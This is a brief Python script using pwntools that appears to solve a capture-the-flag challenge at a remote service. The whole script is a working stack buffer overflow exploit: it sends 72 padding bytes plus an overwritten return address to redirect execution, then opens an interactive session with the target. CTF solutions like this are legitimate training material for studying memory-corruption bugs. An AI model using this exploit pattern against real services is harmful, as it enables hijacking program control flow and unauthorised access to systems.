from pwn import *
import struct
import pwnlib.elf.elf

r = remote('vsu-ctf.ru', 10007)
v2 = struct.pack('I', 0xBEEFDEAD)
v3 = struct.pack('I', 0xDEADBEEF)
f = struct.pack('Q', 0x00005555555547B3)
#print(r.recv())
res = b'A' * 72 + f
r.sendline(res)
print(res)
print(r.interactive())

#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD

